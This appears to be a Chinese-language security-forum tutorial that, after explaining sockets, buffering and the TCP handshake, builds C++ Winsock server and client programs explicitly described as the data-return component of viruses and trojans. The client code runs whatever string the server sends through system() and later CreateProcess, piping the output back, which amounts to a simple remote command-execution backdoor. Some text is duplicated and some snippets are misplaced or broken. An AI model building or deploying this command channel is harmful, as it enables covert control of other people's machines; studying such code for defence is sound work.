前言
==

数据传输是病毒木马的必备技术之一，而数据回传也成为了病毒木马的一个重要特征，我们就尝试自己写一个程序来实现数据的传输，本文尝试通过c++来进行套接字(socket)的实现

基础知识
====

Socket又称套接字，应用程序通常通过套接字向网络发出请求或者应答网络请求。Socket的本质还是API，是对TCP/IP的封装

**socket缓冲区**
-------------

每个 socket 被创建后，都会分配两个缓冲区，输入缓冲区和输出缓冲区。

write()/send() 并不立即向网络中传输数据，而是先将数据写入缓冲区中，再由TCP协议将数据从缓冲区发送到目标机器。一旦将数据写入到缓冲区，函数就可以成功返回，不管它们有没有到达目标机器，也不管它们何时被发送到网络，这些都是TCP协议负责的事情。

TCP协议独立于 write()/send() 函数，数据有可能刚被写入缓冲区就发送到网络，也可能在缓冲区中不断积压，多次写入的数据被一次性发送到网络，这取决于当时的网络情况、当前线程是否空闲等诸多因素，不由程序员控制。

read()/recv() 函数也是如此，也从输入缓冲区中读取数据，而不是直接从网络中读取，如下图所示

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-848b796b38e7ca04e07493b7142c977f49c9157d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-848b796b38e7ca04e07493b7142c977f49c9157d.png)

这些I/O缓冲区特性如下：

- I/O缓冲区在每个TCP套接字中单独存在；
- I/O缓冲区在创建套接字时自动生成；
- 即使关闭套接字也会继续传送输出缓冲区中遗留的数据；
- 关闭套接字将丢失输入缓冲区中的数据。

**阻塞模式**
--------

对于TCP套接字（默认情况下），当使用 write()/send() 发送数据时：

1\) 首先会检查缓冲区，如果缓冲区的可用空间长度小于要发送的数据，那么 write()/send() 会被阻塞（暂停执行），直到缓冲区中的数据被发送到目标机器，腾出足够的空间，才唤醒 write()/send() 函数继续写入数据。

2\) 如果TCP协议正在向网络发送数据，那么输出缓冲区会被锁定，不允许写入，write()/send() 也会被阻塞，直到数据发送完毕缓冲区解锁，write()/send() 才会被唤醒。

3\) 如果要写入的数据大于缓冲区的最大长度，那么将分批写入。

4\) 直到所有数据被写入缓冲区 write()/send() 才能返回。

当使用 read()/recv() 读取数据时：

1\) 首先会检查缓冲区，如果缓冲区中有数据，那么就读取，否则函数会被阻塞，直到网络上有数据到来。

2\) 如果要读取的数据长度小于缓冲区中的数据长度，那么就不能一次性将缓冲区中的所有数据读出，剩余数据将不断积压，直到有 read()/recv() 函数再次读取。

3\) 直到读取到数据后 read()/recv() 函数才会返回，否则就一直被阻塞。

这就是TCP套接字的阻塞模式。所谓阻塞，就是上一步动作没有完成，下一步动作将暂停，直到上一步动作完成后才能继续，以保持同步性。

对于TCP套接字（默认情况下），当使用 write()/send() 发送数据时：

1\) 首先会检查缓冲区，如果缓冲区的可用空间长度小于要发送的数据，那么 write()/send() 会被阻塞（暂停执行），直到缓冲区中的数据被发送到目标机器，腾出足够的空间，才唤醒 write()/send() 函数继续写入数据。

2\) 如果TCP协议正在向网络发送数据，那么输出缓冲区会被锁定，不允许写入，write()/send() 也会被阻塞，直到数据发送完毕缓冲区解锁，write()/send() 才会被唤醒。

3\) 如果要写入的数据大于缓冲区的最大长度，那么将分批写入。

4\) 直到所有数据被写入缓冲区 write()/send() 才能返回。

当使用 read()/recv() 读取数据时：

1\) 首先会检查缓冲区，如果缓冲区中有数据，那么就读取，否则函数会被阻塞，直到网络上有数据到来。

2\) 如果要读取的数据长度小于缓冲区中的数据长度，那么就不能一次性将缓冲区中的所有数据读出，剩余数据将不断积压，直到有 read()/recv() 函数再次读取。

3\) 直到读取到数据后 read()/recv() 函数才会返回，否则就一直被阻塞。

这就是TCP套接字的阻塞模式。所谓阻塞，就是上一步动作没有完成，下一步动作将暂停，直到上一步动作完成后才能继续，以保持同步性。

**TCP的粘包问题**
------------

上面提到了socket缓冲区和数据的传递过程，可以看到数据的接收和发送是无关的，read()/recv() 函数不管数据发送了多少次，都会尽可能多的接收数据。也就是说，read()/recv() 和 write()/send() 的执行次数可能不同。

例如，write()/send() 重复执行三次，每次都发送字符串"abc"，那么目标机器上的 read()/recv() 可能分三次接收，每次都接收"abc"；也可能分两次接收，第一次接收"abcab"，第二次接收"cabc"；也可能一次就接收到字符串"abcabcabc"。

假设我们希望客户端每次发送一位学生的学号，让服务器端返回该学生的姓名、住址、成绩等信息，这时候可能就会出现问题，服务器端不能区分学生的学号。例如第一次发送 1，第二次发送 3，服务器可能当成 13 来处理，返回的信息显然是错误的。

这就是数据的“粘包”问题，客户端发送的多个数据包被当做一个数据包接收。也称数据的无边界性，read()/recv() 函数不知道数据包的开始或结束标志（实际上也没有任何开始或结束标志），只把它们当做连续的数据流来处理。

在实际状况来说，客户端连续三次向服务器端发送数据，但是服务器端却一次性接收到了所有数据，这就是TCP的粘包问题。

TCP传输详解
-------

TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的通信协议，数据在传输前要建立连接，传输完毕后还要断开连接。

客户端在收发数据前要使用 connect() 函数和服务器建立连接。建立连接的目的是保证IP地址、端口、物理链路等正确无误，为数据的传输开辟通道。

TCP建立连接时要传输三个数据包，俗称三次握手（Three-way Handshaking）。

来看一下TCP数据包的结构

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-74c8f62422eefaf80bb135211b5fc580a32f842e.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-74c8f62422eefaf80bb135211b5fc580a32f842e.png)

带阴影的几个字段需要重点说明一下：

1\) 序号：Seq（Sequence Number）序号占32位，用来标识从计算机A发送到计算机B的数据包的序号，计算机发送数据时对此进行标记。

2\) 确认号：Ack（Acknowledge Number）确认号占32位，客户端和服务器端都可以发送，Ack = Seq + 1。

3\) 标志位：每个标志位占用1Bit，共有6个，分别为 URG、ACK、PSH、RST、SYN、FIN，具体含义如下：

- URG：紧急指针（urgent pointer）有效。
- ACK：确认序号有效。
- PSH：接收方应该尽快将这个报文交给应用层。
- RST：重置连接。
- SYN：建立一个新连接。
- FIN：断开一个连接。

使用 connect() 建立连接时，客户端和服务器端会相互发送三个数据包

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-77af28c510a0dafdea9508d3c3fe6baa1699c089.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-77af28c510a0dafdea9508d3c3fe6baa1699c089.png)

客户端调用 socket() 函数创建套接字后，因为没有建立连接，所以套接字处于`CLOSED`状态；服务器端调用 listen() 函数后，套接字进入`LISTEN`状态，开始监听客户端请求。

这个时候，客户端开始发起请求：

1\) 当客户端调用 connect() 函数后，TCP协议会组建一个数据包，并设置 SYN 标志位，表示该数据包是用来建立同步连接的。同时生成一个随机数字 1000，填充“序号（Seq）”字段，表示该数据包的序号。完成这些工作，开始向服务器端发送数据包，客户端就进入了`SYN-SEND`状态。

2\) 服务器端收到数据包，检测到已经设置了 SYN 标志位，就知道这是客户端发来的建立连接的“请求包”。服务器端也会组建一个数据包，并设置 SYN 和 ACK 标志位，SYN 表示该数据包用来建立连接，ACK 用来确认收到了刚才客户端发送的数据包。

服务器生成一个随机数 2000，填充“序号（Seq）”字段。2000 和客户端数据包没有关系。

服务器将客户端数据包序号（1000）加1，得到1001，并用这个数字填充“确认号（Ack）”字段。

服务器将数据包发出，进入`SYN-RECV`状态。

3\) 客户端收到数据包，检测到已经设置了 SYN 和 ACK 标志位，就知道这是服务器发来的“确认包”。客户端会检测“确认号（Ack）”字段，看它的值是否为 1000+1，如果是就说明连接建立成功。

接下来，客户端会继续组建数据包，并设置 ACK 标志位，表示客户端正确接收了服务器发来的“确认包”。同时，将刚才服务器发来的数据包序号（2000）加1，得到 2001，并用这个数字来填充“确认号（Ack）”字段。

客户端将数据包发出，进入`ESTABLISED`状态，表示连接已经成功建立。

4\) 服务器端收到数据包，检测到已经设置了 ACK 标志位，就知道这是客户端发来的“确认包”。服务器会检测“确认号（Ack）”字段，看它的值是否为 2000+1，如果是就说明连接建立成功，服务器进入`ESTABLISED`状态。

至此，客户端和服务器都进入了`ESTABLISED`状态，连接建立成功，接下来就可以收发数据了

三次握手的关键是要确认对方收到了自己的数据包，这个目标就是通过“确认号（Ack）”字段实现的。计算机会记录下自己发送的数据包序号 Seq，待收到对方的数据包后，检测“确认号（Ack）”字段，看`Ack = Seq + 1`是否成立，如果成立说明对方正确收到了自己的数据包。

实现原理
====

我们知道数据传输肯定是有一个发送端和一个接收端的，这里我们可以称之为服务器端和客户端，这两个都需要初始化`Winsock`服务环境

这里简单说一下`Winsock`

Winsock是windows系统下利用Socket套接字进行网络编程的相关函数，是Windows下的网络编程接口。

Winsock在常见的Windows平台上有两个主要的版本，即Winsock1和Winsock2。编写与Winsock1兼容的程序你需要引用头文件WINSOCK.H，如果编写使用Winsock2的程序，则需要引用WINSOCK2.H。此外还有一个MSWSOCK.H头文件，它是专门用来支持在Windows平台上高性能网络程序扩展功能的。使用WINSOCK.H头文件时，同时需要库文件WSOCK32.LIB，使用WINSOCK2.H时，则需要WS2\_32.LIB，如果使用MSWSOCK.H中的扩展API，则需要MSWSOCK.LIB。正确引用了头文件，并链接了对应的库文件，你就构建起编写WINSOCK网络程序的环境了。

服务端在初始化`Winsock`环境过后，便调用`Socket`函数创建流式套接字，然后对`sockaddr_in`结构体进行设置，设置服务器绑定的IP地址和端口等信息并调用`bind`函数来绑定。绑定成功后，就可以调用`listen`函数设置连接数量，并进行监听。直到有来自客户端的连接请求，服务器便调用`accept`函数接受连接请求，建立连接，与此同时，便可以使用`recv`函数和`send`函数与客户端进行数据收发

客户端初始化环境后，便调用`Socket`函数同样创建流式套接字，然后对`sockaddr_in`结构体进行设置，这里与服务器端不同，它不需要用`bind`绑定，也不需要`listen`监听，他直接使用`connect`等待服务器端发送是数据，建立连接过后，也是使用`recv`和`send`函数来进行数据接收

实现过程
====

这里需要用到的几个api首先看一下结构

**Socket**

主要用于根据指定的地址族、数据类型和协议分配一个套接口的描述字

```c++
SOCKET WSAAPI socket(
  [in] int af,
  [in] int type,
  [in] int protocol
);
```

**bind**

这个api的作用就是将本地地址与套接字相关联

```c++
int bind(
  [in] SOCKET         s,
       const sockaddr *addr,
  [in] int            namelen
);
```

**listen**

将一个套接字置于正在监听传入连接的状态

```c++
int WSAAPI listen(
  [in] SOCKET s,
  [in] int    backlog
);
```

首先我们写服务端的代码，一开始是初始化winsock环境

```c++
    WSADATA wsadata = { 0 };

    WORD w_version_req = MAKEWORD(2, 2);

    WSAStartup(w_version_req, &wsadata);
```

然后创建流式socket

```c++
 SOCKET g_SeverSocket = socket(AF_INET, SOCK_STREAM, NULL);
```

设置服务器的端口并绑定ip

```c++
bind(g_SeverSocket, (LPSOCKADDR)&ServerAddr, sizeof(ServerAddr));
```

设置监听客户端的数量，这里我设置为5

```c++
::listen(g_SeverSocket, 5);
```

然后是服务端收到接收端的信息之后接收连接请求，使用`accept`

```c++
g_clientsocket = ::accept(g_ServerSocket, (sockaddr*)(&addr), &dwLength);
```

创建一个缓冲区接收数据

```c++
char szBuffer[MAX_PATH] = { 0 };

int Ret = ::recv(g_clientsocket, szBuffer, MAX_PATH, 0);
```

确认接收请求过后即可进行数据通信，使用`send`

```c++
    ::send(g_clientsocket, cmd, (::strlen(cmd) + 1), 0);
    printf("[*] send:%s\n", cmd);
```

服务端完整代码如下

```c++
BOOL SocketListen(LPSTR ipaddr, int port)
{
    // 初始化winsock环境
    WSADATA wsadata = { 0 };

    // 初始化Winsock版本号
    WORD w_version_req = MAKEWORD(2, 2);

    if (WSAStartup(w_version_req, &wsadata) == SOCKET_ERROR || &wsadata == nullptr)
    {
        printf("[!] Failed to initialize Winsock \n");
        return FALSE;
    }
    else
    {
        printf("[*] Initialize Winsock successfully!\n");
    }

    // 创建流式socket
    g_ServerSocket = socket(AF_INET, SOCK_STREAM, NULL);

    if (g_ServerSocket == INVALID_SOCKET)
    {
        printf("[!] Create socket Failed\n");
        return FALSE;
    }
    else
    {
        printf("[*] Create socket successfully!\n");
    }

    // 设置服务端地址和端口

    sockaddr_in ServerAddr;
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = ::htons(port);
    ServerAddr.sin_addr.S_un.S_addr = ::inet_addr(ipaddr);

    // 绑定端口ip
    if (NULL != ::bind(g_ServerSocket, (LPSOCKADDR)&ServerAddr, sizeof(ServerAddr)))
    {
        printf("[!] Bind port failed\n");
        return FALSE;
    }
    else
    {
        printf("[*] Bind portBind port successfully!\n");
    }

    // 设置监听客户端数量
    if (NULL != ::listen(g_ServerSocket, 5))
    {
        printf("[!] Listen port failed\n");
        return FALSE;
    }
    else
    {
        printf("[*] Listen port successfully!\n");
    }

    return TRUE;
}

void AcceptMessage()
{
    sockaddr_in addr = { 0 };

    int dwLength = sizeof(addr);

    g_clientsocket = ::accept(g_ServerSocket, (sockaddr*)(&addr), &dwLength);

    printf("Accept link the client!\n");

    char szBuffer[MAX_PATH] = { 0 };
    while (TRUE)
    {
        int Ret = ::recv(g_clientsocket, szBuffer, MAX_PATH, 0);

        if (Ret <= 0)
        {
            continue;
        }

        printf("[*] recv:%s\n", szBuffer);
    }
}

void SendMessage()
{
    char cmd[100] = { 0 };
    cin.getline(cmd, 100);

    ::send(g_clientsocket, cmd, (::strlen(cmd) + 1), 0);
    printf("[*] send:%s\n", cmd);
}
```

然后再是客户端的代码编写，客户端跟服务端唯一一点不同的就是没有`bind`和`listen`即监听过程，直接连接即可

将一个套接字置于正在监听传入连接的状态

```c++
int WSAAPI listen(
  [in] SOCKET s,
  [in] int    backlog
);
```

一开始还是初始化winsock环境

```c++
    WSADATA wsadata = { 0 };

    WORD w_version_req = MAKEWORD(2, 2);

    WSAStartup(w_version_req, &wsadata);
```

然后创建流式socket

```c++
 SOCKET g_SeverSocket = socket(AF_INET, SOCK_STREAM, NULL);
```

使用`connect`连接服务端

```c++
connect(g_SeverSocket, (LPSOCKADDR)&ServerAddr, sizeof(ServerAddr));
```

然后创建线程接收数据

```c++
::CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, NULL, NULL);
```

这里建立了连接那么即可以接收信息，也可以发送信息

```c++
void SendMsg(char* pszSend)
{
    //发送数据

    ::send(g_ClientSocket, pszSend, (::strlen(pszSend) + 1), 0);
    printf("[*] Sent:%s",pszSend);
}

void GetMsg()
{
    char szBuffer[MAX_PATH] = { 0 };

    while (TRUE)
    {
        int Ret = ::recv(g_ClientSocket, szBuffer, MAX_PATH, 0);
        if (Ret <= 0)
        {
            continue;
        }

        system(szBuffer);
        SendMsg((LPSTR)"The command executed successfully");
    }
}
```

到这个地方一个demo就已经完成，我们运行下程序看一下，首先打开服务端

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5e2a4460908aa47cda4b00c387e299cd2179e1ca.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5e2a4460908aa47cda4b00c387e299cd2179e1ca.png)

再打开客户端，可以看到已经连接成功

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-aa7fbeee5f9276b1b6e6a82189b2d15f8b61597a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-aa7fbeee5f9276b1b6e6a82189b2d15f8b61597a.png)

这里执行下系统命令可以看到在客户端已经执行成功，但是有一个问题，我们如果要想在客户端显示服务端执行的命令该怎么办呢？

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-deda7f13b2c522094ac14a2ea886f8b188e063a9.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-deda7f13b2c522094ac14a2ea886f8b188e063a9.png)

这里就涉及到了进程间的通信，一开始我准备用共享内存去实现的，但是好像共享内存不能够接收到`system()`执行后的内容，先看下代码

```c++
        HANDLE hMapObject;
        HANDLE hMapView;

        //创建FileMapping对象               
        hMapObject = CreateFileMapping((HANDLE)0xFFFFFFFF, NULL, PAGE_READWRITE, 0, 0x1000, TEXT("shared"));
        if (!hMapObject)
        {
            printf("[!] ShareMemory failed\n\n");
            return FALSE;
        }
        //将FileMapping对象映射到自己的进程                
        hMapView = MapViewOfFile(hMapObject, FILE_MAP_WRITE, 0, 0, 0);
        if (!hMapView)
        {
            printf("[!] MapViewOfFile failed\n\n");
            return FALSE;
        }
        //向共享内存写入数据             
        strcpy((char*)hMapView, (const char*)system(szBuffer));

        SendRet((LPSTR)"The command executed successfully");

        return TRUE;
```

主要是`strcpy()`这个函数是用来向共享内存写入数据的，所以第二个参数就是`system()`执行过后的返回值，但是第二个值的属性是`const char*`，这里如果我强转类型的话就会报错

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5340e53b222f3b5cceea649e2977643729e6b391.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5340e53b222f3b5cceea649e2977643729e6b391.png)

这里我写一个test函数进行测试看一下`system()`的参数能不能接收到

```c++
void test()
{
    int i = system("whoami");
    printf("%s", i);
}
```

执行一下看一下输出，可以看到`system()`函数自动输出结果，而不会进入参数i，后面打印也是null，后面查阅了资料`system()`函数只是提供了一个接口的作用，所以共享内存的方法来接收数据不太现实，这里换了一个匿名管道的方式接收数据

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ad201abf5e96c05b40902e3968e040d8e993fb64.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ad201abf5e96c05b40902e3968e040d8e993fb64.png)

匿名管道的实现代码如下

```c++
HANDLE hRead;                                       
HANDLE hWrite;  

SECURITY_ATTRIBUTES sa;                                     

sa.bInheritHandle = TRUE;                                       
sa.lpSecurityDescriptor = NULL;                                     
sa.nLength = sizeof(SECURITY_ATTRIBUTES);                                       

if(!CreatePipe(&hRead,&hWrite,&sa,0))                                       
    {
        printf("CreatePipe Failed\n\n");
        return FALSE;
    }                                   

STARTUPINFO si;                                     
//PROCESS_INFORMATION pi;
ZeroMemory(&si,sizeof(STARTUPINFO));                                        

si.cb = sizeof(STARTUPINFO);                                        
si.dwFlags = STARTF_USESTDHANDLES;                                      
si.hStdInput = hRead;                                       
si.hStdOutput = hWrite;                                     
si.hStdError = GetStdHandle(STD_ERROR_HANDLE);  

if (!::CreateProcessA(NULL, lpscmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) 
{
    printf("Create Process failed, error is : %d", GetLastError());
    return FALSE;
}
CloseHandle(hWrite);

::WaitForSingleObject(pi.hThread, -1);
::WaitForSingleObject(pi.hProcess, -1);

   ::RtlZeroMemory(lpsRetBuffer, RetBufferSize);

if (!::ReadFile(hRead, lpsRetBuffer, 4096, &RetBufferSize, NULL)) 
{
    printf("Readfile failed, error is : %d", GetLastError());
    return FALSE;
}

CloseHandle(hRead);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
return TRUE;
```

实现效果
====

之前demo实现的效果在recv处是看不到接收端的数据的，如下所示

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-53abd57e604f759866fb5cbf70471f7dfe0ddbdf.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-53abd57e604f759866fb5cbf70471f7dfe0ddbdf.png)

加一个匿名管道进行进程间的通信过后可以直接在服务端看到客户端的返回数据

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ee3afe9f3efcef6fbc8b9d62631d42bd0b65ef4f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ee3afe9f3efcef6fbc8b9d62631d42bd0b65ef4f.png)